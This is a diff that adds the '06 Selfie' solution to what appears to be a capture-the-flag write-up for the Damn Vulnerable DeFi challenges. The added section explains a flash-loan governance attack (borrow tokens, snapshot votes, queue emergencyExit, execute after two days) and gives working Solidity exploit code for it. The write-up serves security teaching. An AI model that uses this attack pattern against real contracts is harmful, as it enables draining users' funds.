@@ -7,6 +7,7 @@
 - [03 Truster](#03-truster)
 - [04 Side Entrance](#04-side-entrance)
 - [05 The Rewarder](#05-the-rewarder)
+- [06 Selfie](#06-selfie)
 
 <!-- /MarkdownTOC -->
 
@@ -294,5 +295,73 @@ function receiveFlashLoan(uint256 amount) public {
 
   // pay back the flash loan
   liquidityToken.transfer(msg.sender, amount);
+}
+```
+
+## 06 Selfie
+
+To beat this level, we need to comply with
+
+```solidity
+assertEq(token.balanceOf(msg.sender), TOKENS_IN_POOL);
+assertEq(token.balanceOf(address(pool)), 0);
+```
+
+In other words: Drain the pool, get all the funds.
+
+### Solution
+
+* The function `emergencyExit()` can drain the pool, but has the `onlyGovernance` modifier.
+
+* The `onlyGovernance` modifier controls that only the `SimpleGovernance` contract executes this function.
+  * We can add this function at `queueAction()` so `executeAction()` will invoke it.
+
+* Now, `queueAction()` asks you to have enough votes (`hasEnoughVotes(msg.sender)`).
+  * To have the votes, you need to have enough of the contract's `_governanceToken`, which is the same `token` of the pool. That is, we can just take a flash loan, issue a `snapshot()`, and get the majority of votes.
+  * After we run the `snapshot()`, we can deliver the payload.
+
+* Because `executeAction()` will ask for a minimum `ACTION_DELAY_IN_SECONDS` of `2 days`, we would have to wait IRL for that time to execute the attack. We just pretend we do with `vm.warp(block.timestamp + 2 days)`. Also we would get the `actionId` by inspecting the `ActionQueued` event log.
+
+Putting eveerything together, we have
+
+```solidity
+function onFlashLoan(
+      address,
+      address,
+      uint256 amount,
+      uint256,
+      bytes calldata
+  ) external returns (bytes32) {
+  // since this implements DamnValuableTokenSnapshot,
+  // we can just issue a snapshot.
+  // as we were able to borrow the maximum of the pool,
+  // we will get the majority of the votes.
+  governanceToken.snapshot();
+
+  // prepare the payload
+  bytes memory data = abi.encodeWithSelector(
+    ISelfiePool.emergencyExit.selector,
+    player
+  );
+
+  // deliver the payload
+  governance.queueAction(
+    address(pool),
+    0,
+    data
+  );
+
+  // return the funds
+  token.approve(msg.sender, amount);
+  return keccak256("ERC3156FlashBorrower.onFlashLoan");
+}
+
+// .... wait for 2 days ....
+// then:
+
+function attack() public {
+  // IRL we would obtain this id parameter by inspecting
+  // the log of the ActionQueued event.
+  governance.executeAction(1);
 }
 ```
